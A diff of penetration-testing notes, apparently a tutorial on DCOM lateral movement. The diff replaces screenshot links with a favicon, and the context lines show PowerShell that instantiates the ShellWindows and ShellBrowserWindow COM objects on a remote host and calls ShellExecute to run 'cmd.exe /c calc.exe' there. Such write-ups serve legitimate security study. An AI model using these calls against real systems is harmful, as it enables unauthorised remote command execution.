@@ -43,7 +43,7 @@ Viewing which other objects that have no explicit LaunchPermission set can be ac
 
 Another way to identify potential target objects is to look for the value `LaunchPermission` missing from keys in `HKCR:\AppID\{guid}`. An object with Launch Permissions set will look like below, with data representing the ACL for the object in Binary format:
 
-![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)
+![](https://www.baidu.com/favicon.ico) [comment]: <> (![]&#40;https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)
 
 Those with no explicit LaunchPermission set will be missing that specific registry entry.
 
@@ -64,7 +64,7 @@ $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0
 $obj = [System.Activator]::CreateInstance($com)
 ```
 
-![](https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)
+![](https://www.baidu.com/favicon.ico) [comment]: <> (![]&#40;https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)
 
 With the object instantiated on the remote host, we can interface with it and invoke any methods we want. The returned handle to the object reveals several methods and properties, none of which we can interact with. In order to achieve actual interaction with the remote host, we need to access the [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) method, which will give us back an object that represents the Windows shell window:
 
@@ -72,7 +72,7 @@ With the object instantiated on the remote host, we can interface with it and in
 $item = $obj.Item()
 ```
 
-![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)
+![](https://www.baidu.com/favicon.ico) [comment]: <> (![]&#40;https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)
 
 With a full handle on the Shell Window, we can now access all of the expected methods/properties that are exposed. After going through these methods, **`Document.Application.ShellExecute`** stood out. Be sure to follow the parameter requirements for the method, which are documented [here](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx).
 
@@ -80,7 +80,7 @@ With a full handle on the Shell Window, we can now access all of the expected me
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
 
-![](https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)
+![](https://www.baidu.com/favicon.ico) [comment]: <> (![]&#40;https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)
 
 As you can see above, our command was executed on a remote host successfully.
 
@@ -105,7 +105,7 @@ $obj = [System.Activator]::CreateInstance($com)
 $obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
 ```
 
-![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)
+![](https://www.baidu.com/favicon.ico) [comment]: <> (![]&#40;https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)
 
 As you can see, the command successfully executed on the remote target.
 
